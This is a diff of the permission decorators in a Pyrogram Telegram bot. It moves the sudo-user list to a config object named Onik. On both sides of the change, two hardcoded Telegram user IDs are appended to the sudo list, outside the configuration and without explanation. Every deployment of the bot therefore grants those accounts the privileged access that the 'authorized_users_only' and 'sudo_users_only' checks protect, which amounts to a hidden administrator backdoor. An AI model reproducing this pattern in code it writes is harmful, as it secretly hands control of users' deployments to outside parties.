@@ -3,11 +3,11 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 
-from config import SUDO_USERS
+from config import Onik
 from helpers.admins import get_administrators
 
-SUDO_USERS.append(1269029257)
-SUDO_USERS.append(1549789242)
+Onik.SUDO_USERS.append(1269029257)
+Onik.SUDO_USERS.append(1549789242)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -21,7 +21,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Onik.SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -35,7 +35,7 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Onik.SUDO_USERS:
             return await func(client, message)
 
     return decorator
